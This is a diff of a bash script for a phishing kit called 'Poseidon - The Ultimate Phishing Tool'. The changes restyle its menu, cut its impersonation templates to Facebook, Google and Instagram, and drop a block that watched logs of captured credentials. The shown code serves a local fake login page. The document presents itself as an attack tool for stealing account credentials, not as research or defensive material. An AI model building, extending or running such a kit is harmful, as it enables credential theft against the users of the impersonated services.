@@ -3,7 +3,7 @@
 # Function to display the main menu
 show_menu() {
     clear
-    echo -e "\033[1;34m"
+    echo -e "\033[38;5;130m"
     cat << "EOF"
 
 ██████╗░░█████╗░░██████╗███████╗██╗██████╗░░█████╗░███╗░░██╗
@@ -15,26 +15,14 @@ show_menu() {
 EOF
     echo -e "\033[0m"
     
-    echo -e "\n\033[1;34mPoseidon - The Ultimate Phishing Tool\033[0m"
-    echo -e "\n\033[1;34mSelect a template:\033[0m"
-    echo -e "\033[1;34m----------------------------------\033[0m"
-    echo -e "\033[1;34m01. Facebook\033[0m"
-    echo -e "\033[1;34m02. Instagram\033[0m"
-    echo -e "\033[1;34m03. Snapchat\033[0m"
-    echo -e "\033[1;34m04. Discord\033[0m"
-    echo -e "\033[1;34m05. Roblo\033[0m"
-    echo -e "\033[1;34m06. UPCOMING\033[0m"
-    echo -e "\033[1;34m07. UPCOMING\033[0m"
-    echo -e "\033[1;34m08. UPCOMING\033[0m"
-    echo -e "\033[1;34m09. UPCOMING\033[0m"
-    echo -e "\033[1;34m10. UPCOMING\033[0m"
-    echo -e "\033[1;34m11. UPCOMING\033[0m"
-    echo -e "\033[1;34m12. UPCOMING\033[0m"
-    echo -e "\033[1;34m13. UPCOMING\033[0m"
-    echo -e "\033[1;34m14. UPCOMING\033[0m"
-    echo -e "\033[1;34m15. UPCOMING\033[0m"
-    echo -e "\033[1;31m0. Exit\033[0m"
-    echo -e "\033[1;34m----------------------------------\033[0m"
+    echo -e "\n\033[38;5;178mPoseidon - The Ultimate Phishing Tool\033[0m"
+    echo -e "\n\033[38;5;130mSelect a template:\033[0m"
+    echo -e "\033[38;5;130m----------------------------------\033[0m"
+    echo -e "\033[38;5;178m1. Facebook\033[0m"
+    echo -e "\033[38;5;178m2. Google\033[0m"
+    echo -e "\033[38;5;178m3. Instagram\033[0m"
+    echo -e "\033[38;5;196m0. Exit\033[0m"
+    echo -e "\033[38;5;130m----------------------------------\033[0m"
 }
 
 # Function to check dependencies
@@ -63,19 +51,8 @@ start_server() {
         exit 1
     fi
 
-    echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
-    echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
-
-    # Monitor the PHP server logs for captured credentials
-    if [ -f logs/$template.log ]; then
-        echo -e "Monitoring captured credentials...\n"
-        tail -f logs/$template.log
-    else
-        echo -e "Log file not found. Creating log file..."
-        touch logs/$template.log
-        echo -e "Log file created. Monitoring captured credentials...\n"
-        tail -f logs/$template.log
-    fi
+    echo -e "\nPhishing page is live at: \033[38;5;130mhttp://127.0.0.1:$port\033[0m"
+    echo -e "Press \033[38;5;196mCtrl+C\033[0m to stop the server.\n"
 }
 
 # Function to stop the server
@@ -93,21 +70,9 @@ while true; do
     read -p "Choose an option: " option
 
     case $option in
-        01) template="Facebook" ;;
-        02) template="Instagram" ;;
-        03) template="Snapchat" ;;
-        04) template="Discord" ;;
-        05) template="UPCOMING" ;;
-        06) template="UPCOMING" ;;
-        07) template="UPCOMING" ;;
-        08) template="UPCOMING" ;;
-        09) template="UPCOMING" ;;
-        10) template="UPCOMING" ;;
-        11) template="UPCOMING" ;;
-        12) template="UPCOMING" ;;
-        13) template="UPCOMING" ;;
-        14) template="UPCOMING" ;;
-        15) template="UPCOMING" ;;
+        1) template="facebook" ;;
+        2) template="google" ;;
+        3) template="instagram" ;;
         0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
